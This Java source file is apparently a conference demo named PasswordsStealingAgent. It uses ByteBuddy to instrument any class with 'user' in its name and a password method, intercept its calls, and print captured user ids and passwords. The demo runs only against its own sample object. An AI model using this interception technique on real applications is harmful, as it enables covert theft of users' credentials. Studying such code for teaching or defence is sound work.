package com.epam.jvmmagic.black;

import net.bytebuddy.agent.ByteBuddyAgent;
import net.bytebuddy.agent.builder.AgentBuilder.Default;
import net.bytebuddy.implementation.MethodDelegation;
import net.bytebuddy.implementation.bind.annotation.*;
import net.bytebuddy.matcher.ElementMatchers;

import java.lang.reflect.Method;
import java.util.IdentityHashMap;
import java.util.Map;
import java.util.concurrent.Callable;

import static net.bytebuddy.matcher.ElementMatchers.any;

public class PasswordsStealingAgent {

    private static Map<Object, StolenDetails> stolenDetails = new IdentityHashMap<>();

    public static void main(String[] args) throws Exception {

        ByteBuddyAgent.install();

        new Default()
                .type(ElementMatchers.nameContainsIgnoreCase("user").and(
                        ElementMatchers.declaresMethod(
                                ElementMatchers.nameContainsIgnoreCase("password").and(
                                        ElementMatchers.takesArguments(String.class)
                                )
                        )))
                .transform((builder, typeDescription, classLoader, module) -> builder
                        .method(any())
                        .intercept(MethodDelegation.to(PasswordsStealingAgent.class)))
                .installOnByteBuddyAgent();

        User user = new User();
        user.setPassword("qwerty");
        user.setUserId("Tech Talks");
        System.out.println(user);
    }

    @RuntimeType
    public static Object intercept(@SuperCall Callable<?> superMethod,
                                   @Origin Method method,
                                   @This Object user,
                                   @AllArguments Object[] methodArgs

    ) throws Exception {
        StolenDetails details = stolenDetails.computeIfAbsent(user, key -> new StolenDetails());

        if (method.getName().toLowerCase().contains("password") && methodArgs.length > 0) {
            details.setPassword(methodArgs[0] + "");
        } else if (method.getName().toLowerCase().contains("id") && methodArgs.length > 0) {
            details.setUserId(methodArgs[0] + "");
        }

        if (details.getPassword() != null && details.getUserId() != null && methodArgs.length > 0) {
            System.err.println("Stolen " + details);
        }

        return superMethod.call();
    }

    private static class StolenDetails {

        private String userId;
        private String password;

        String getUserId() {
            return userId;
        }

        void setUserId(String userId) {
            this.userId = userId;
        }

        String getPassword() {
            return password;
        }

        void setPassword(String password) {
            this.password = password;
        }

        @Override
        public String toString() {
            return "StolenDetails{" +
                   "userId='" + userId + '\'' +
                   ", password='" + password + '\'' +
                   '}';
        }
    }
}
